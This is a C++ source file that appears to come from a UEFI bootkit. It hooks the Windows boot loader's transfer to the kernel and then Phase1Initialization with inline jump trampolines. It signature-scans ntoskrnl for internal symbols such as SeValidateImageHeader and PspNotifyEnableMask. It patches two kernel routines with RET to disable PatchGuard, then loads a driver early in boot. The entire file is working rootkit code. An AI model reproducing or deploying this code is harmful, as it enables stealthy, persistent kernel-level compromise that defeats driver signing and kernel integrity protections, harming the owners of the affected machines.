#include "hook.hpp"
#include "loader.hpp"
#include "utils.hpp"
#include <intrin.h>

unsigned char Shell[]{
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, Address
	0xFF, 0xE0,													// jmp rax
};

typedef void(*tOslArchTransferToKernel)(PLOADER_PARAMETER_BLOCK LoaderBlock, void* KernelEntrypoint);
tOslArchTransferToKernel OslArchTransferToKernelOriginal;
unsigned char OslArchTransferToKernelShell[12];

typedef void(*tPhase1Initialization)(void* StartContext);
tPhase1Initialization Phase1InitializationOriginal;
unsigned char Phase1InitializationShell[12];

void Phase1InitializationHook(void* StartContext) {
	Utils::MemCpy(Phase1InitializationOriginal, Phase1InitializationShell, 12);

	// Waiting for function
	Phase1InitializationOriginal(StartContext);

	// Restoring original bytes in nt!KeInitAmd64SpecificState and nt!ExpLicenseWatchInitWorker
	if (KeInitAmd64SpecificState)
		Utils::MemCpy(KeInitAmd64SpecificState, (void*)"\x48", 1);
	if (ExpLicenseWatchInitWorker)
		Utils::MemCpy(ExpLicenseWatchInitWorker, (void*)"\x48", 1);

	Loader::LoadDriver();
}

// KernelEntrypoint (OslEntryPoint) -> nt!KiSystemStartup
void OslArchTransferToKernelHook(PLOADER_PARAMETER_BLOCK LoaderBlock, void* KernelEntrypoint) {
	Utils::MemCpy(OslArchTransferToKernelOriginal, OslArchTransferToKernelShell, 12);

	// Getting ntoskrnl entry
	PLDR_DATA_TABLE_ENTRY Ntoskrnl = (PLDR_DATA_TABLE_ENTRY)LoaderBlock->LoadOrderListHead.Flink;

	// Searching for nt!Phase1Initialization
	Phase1InitializationOriginal = (tPhase1Initialization)Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x48\x89\x5C\x24\x00\x57\x48\x83\xEC\x30\x48\x8B\xD9\x33\xC9", "xxxx?xxxxxxxxxx", 15, Ntoskrnl->SizeOfImage);
	if (Phase1InitializationOriginal == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);

	// Searching for nt!MmLoadSystemImage
	MmLoadSystemImage = (tMmLoadSystemImage)Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x48\x83\xEC\x48\x41\xF7\xC1", "xxxxxxx", 7, Ntoskrnl->SizeOfImage);
	if (MmLoadSystemImage == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);

	// Searching for nt!PsLoadedModuleList
	PsLoadedModuleList = (LIST_ENTRY*)Utils::SignatureScan(Ntoskrnl->DllBase,
		"\x48\x8B\x15\x00\x00\x00\x00\x48\x85\xD2\x74\x28", "xxx????xxxxx", 12, Ntoskrnl->SizeOfImage);
	if (PsLoadedModuleList == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);
	PsLoadedModuleList = (LIST_ENTRY*)((UINT64)PsLoadedModuleList + *(INT32*)((UINT64)PsLoadedModuleList + 3) + 7);

	// Searching for nt!PspNotifyEnableMask
	PspNotifyEnableMask = (UINT32*)Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\xF0\x0F\xBA\x2D\x00\x00\x00\x00\x00\x33\xDB", "xxxx?????xx", 11, Ntoskrnl->SizeOfImage);
	if (PspNotifyEnableMask == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);
	PspNotifyEnableMask = (UINT32*)((UINT64)PspNotifyEnableMask + *(INT32*)((UINT64)PspNotifyEnableMask + 4) + 9);

	// Searching for nt!SeValidateImageHeader
	SeValidateImageHeader = Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x48\x81\xEC\x00\x00\x00\x00\x33\xF6\x48\x8B\xDA", "xxx????xxxxx", 12, Ntoskrnl->SizeOfImage);
	if (SeValidateImageHeader == nullptr)
		return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);
	SeValidateImageHeader = (void*)((UINT64)SeValidateImageHeader - 12);

	// Searching for nt!KeInitAmd64SpecificState
	KeInitAmd64SpecificState = Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x48\x83\xEC\x28\x0F\xAE\xE8", "xxxxxxx", 7, Ntoskrnl->SizeOfImage);
	if (KeInitAmd64SpecificState)
		*(CHAR*)(KeInitAmd64SpecificState) = 0xC3;

	// Searching for nt!ExpLicenseWatchInitWorker
	ExpLicenseWatchInitWorker = Utils::SignatureScan(Ntoskrnl->DllBase, 
		"\x57\x48\x83\xEC\x30\x0F\xAE\xE8", "xxxxxxxx", 8, Ntoskrnl->SizeOfImage);
	if (ExpLicenseWatchInitWorker) {
		ExpLicenseWatchInitWorker = (void*)((UINT64)ExpLicenseWatchInitWorker - 10);
		*(CHAR*)(ExpLicenseWatchInitWorker) = 0xC3;
	}

	// Installing winload!OslArchTransferToKernel hook
	void* NewPointer = Phase1InitializationHook;
	g_ST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, &NewPointer);

	*(UINT64*)&Shell[2] = (UINT64)NewPointer;
	Utils::MemCpy(Phase1InitializationShell, Phase1InitializationOriginal, 12);
	Utils::MemCpy(Phase1InitializationOriginal, Shell, 12);

	return OslArchTransferToKernelOriginal(LoaderBlock, KernelEntrypoint);
}

void Hook::OslArchTransferToKernel(void* Address) {
	// Searching for winload!OslArchTransferToKernel
	OslArchTransferToKernelOriginal = (tOslArchTransferToKernel)Utils::SignatureScan(Address, 
		"\x33\xF6\x4C\x8B\xE1\x4C\x8B\xEA\x0F\x09", "xxxxxxxxxx", 10, 0x300000);
	if (OslArchTransferToKernelOriginal == nullptr)
		return;
	g_ST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, (void**)&OslArchTransferToKernelOriginal);

	// Installing winload!OslArchTransferToKernel hook
	void* NewPointer = OslArchTransferToKernelHook;
	g_ST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, &NewPointer);

	*(UINT64*)&Shell[2] = (UINT64)NewPointer;
	Utils::MemCpy(OslArchTransferToKernelShell, OslArchTransferToKernelOriginal, 12);
	Utils::MemCpy(OslArchTransferToKernelOriginal, Shell, 12);
}